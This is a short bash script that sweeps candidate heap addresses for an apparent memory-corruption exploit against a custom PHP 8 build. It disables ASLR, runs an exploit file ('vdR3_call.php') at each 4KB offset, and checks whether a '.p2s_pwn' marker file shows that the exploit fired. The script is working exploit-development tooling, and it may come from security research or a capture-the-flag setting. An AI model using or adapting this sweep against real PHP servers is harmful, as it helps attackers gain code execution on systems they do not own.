#!/bin/bash
# Full fine sweep of chunk 1 for the zero4 8160-block (one-time calibration).
set -u
PHP=/tmp/php8512_build/plain2/sapi/cli/php
cd /tmp/dbg_zero4
BASEDEC=0093824990838784
START=0
END=524288   # sweep first 512KB of chunk1 at 4KB step
for (( off=START; off<=END; off+=4096 )); do
  base=$((0x7ffff5400000 + off))
  dec=$(printf "%016d" $base)
  rm -f /tmp/.p2s_pwn /tmp/.p2s_cmd
  timeout 30 setarch x86_64 -R $PHP -n vdR3_call.php "$dec" "$BASEDEC" >/dev/null 2>&1
  if [ -f /tmp/.p2s_pwn ]; then echo "HIT chunk1+0x$(printf %x $off) :: $(cat /tmp/.p2s_pwn | head -2)"; exit 0; fi
done
echo no-hit-in-first-512K
